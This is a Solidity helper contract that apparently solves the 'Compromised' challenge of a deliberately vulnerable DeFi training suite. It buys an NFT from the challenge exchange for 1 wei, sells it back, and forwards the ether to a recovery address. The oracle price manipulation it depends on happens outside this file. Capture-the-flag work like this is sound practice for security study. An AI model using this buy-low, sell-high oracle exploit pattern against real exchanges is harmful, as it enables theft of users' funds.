// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedSolve is IERC721Receiver {
    Exchange exchange;
    DamnValuableNFT nft;
    address recovery;
    uint256 buyID;
    
    constructor(Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    function buy() external payable {
        buyID = exchange.buyOne{value: 1}();
    }

    function sell() external payable {
        nft.approve(address(exchange), buyID);
        exchange.sellOne(buyID);
    }

    function recover(uint256 amount) external {
        payable(recovery).transfer(amount);
    }

    // Fix error "Contract "CompromisedSolve" should be marked as abstract.solidity(3656)"
    function onERC721Received(address,address,uint256,bytes calldata) 
    external pure returns (bytes4){
        return this.onERC721Received.selector;
    }
    receive() external payable{
    }
}